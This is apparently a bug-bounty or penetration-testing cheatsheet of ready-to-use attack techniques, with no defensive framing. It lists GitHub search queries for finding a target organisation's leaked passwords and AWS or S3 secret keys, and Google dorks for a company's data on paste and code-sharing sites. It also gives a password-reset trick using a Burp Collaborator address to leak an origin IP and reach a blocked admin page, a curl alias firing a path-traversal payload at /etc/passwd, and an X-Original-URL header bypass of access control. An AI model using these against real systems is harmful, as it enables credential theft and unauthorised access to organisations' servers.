# Cheatsheet dorking

## Good site for dorking

https://dorks.faisalahmed.me/

## Github dorking

```
Github: Org:org_name "password"
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target  "AWS_ACCESS_KEY_ID"
org:Target  "list_aws_accounts"
```

## Pwn

```
1. Create an account email@burp_collab*
2. Forgot password
3. Received requests from internal server + SMTP connection details
4. Got Internal headers + origin IP
5. http://site.com/admin = (403)
6. http://site.com/admin = (Headers + Origin IP = pwn)
```

## GDork

```
site:http://codepad.co "company"
site:http://scribd.com "company"
site:http://npmjs.com "company"
site:http://npm.runkit.com "company"
site:http://libraries.io "company"
site:http://ycombinator.com "company"
site:http://coggle.it "company"
site:http://papaly.com "company"
site:http://google.com "company"
site:http://trello.com "company"
site:http://prezi.com "company"
site:http://jsdelivr.net "company"
site:http://codepen.io "company"
site:http://codeshare.io "company"
site:http://sharecode.io "company"
site:http://pastebin.com "company"
site:http://repl.it "company"
site:http://productforums.google.com "company"
site:http://gitter.im "company"
site:http://bitbucket.org "company"
site:*.atlassian.net "company"
site: http://atlassian.net "company"
inurl:gitlab "company"
```

## Lfi alias

```
alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{' "
```

## X-Url

```
GET /admin HTTP/1.1
Host: http://site.com
...
Access is denied

GET /test HTTP/1.1
Host: http://site.com
X-Original-URL: /admin

HTTP/1.1 200 OK
```
